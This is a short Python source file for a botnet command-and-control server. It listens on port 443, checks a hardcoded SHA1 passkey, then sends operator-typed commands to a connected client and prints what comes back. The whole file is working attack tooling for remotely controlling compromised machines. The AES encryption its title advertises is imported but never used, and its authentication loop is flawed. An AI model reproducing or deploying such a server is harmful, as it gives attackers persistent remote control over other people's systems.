
##Pure CNC Server With AES Encryption



""""
Command and Control Bot
Server Code
Python 3 Environment
Author: Harris
harrisjnu@gmail.com
"""

#Logging
import logging
LEVELS = { 'debug':logging.DEBUG,
            'info':logging.INFO,
            'warning':logging.WARNING,
            'error':logging.ERROR,
            'critical':logging.CRITICAL,
            }
level_name = 'critical'
level = LEVELS.get(level_name, logging.NOTSET)
logging.basicConfig(level=level)

#Imports
import socket, os, sys, hashlib
#from crypto import AES
from Crypto.Cipher import AES


#Variables
s_host = "0.0.0.0"
s_port = 443
s_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)


def bind():
    try:
        logging.debug("Binding to socket....")
        s_socket.bind((s_host,s_port))
        s_socket.listen(1)
        logging.debug("Binding Successful....")
    except socket.error as error:
        logging.debug("Socket binding error: " + str(error))

def auth():
    ### AUTHENTICATION MODULE
    authcode = conn.recv(1024)
    authkey = authcode.decode()
    passkey = b"passkey"
    passkey = hashlib.sha1(passkey)
    passkey = passkey.hexdigest()
    while True:
        if passkey == authkey:
            logging.debug("Authentication Successful")
            break
        else:
            logging.debug("Auth Failure")
            auth()


def accept():
    global conn
    global addr

    try:
        conn, addr = s_socket.accept()
        logging.debug("Session with client established")
        auth()

    except socket.error as error:
        logging.debug("Socket acceptance error" + str(error))

def command():
    while True:
        cmd = input(" >> ")
        command = conn.send(cmd.encode())
        logging.debug("Command Sent:  " + str(command))
        response = conn.recv(1024)
        logging.debug("Response received: " + str(response))
        response = response.decode()

        print(response)

bind()
while True:
    accept()
    command()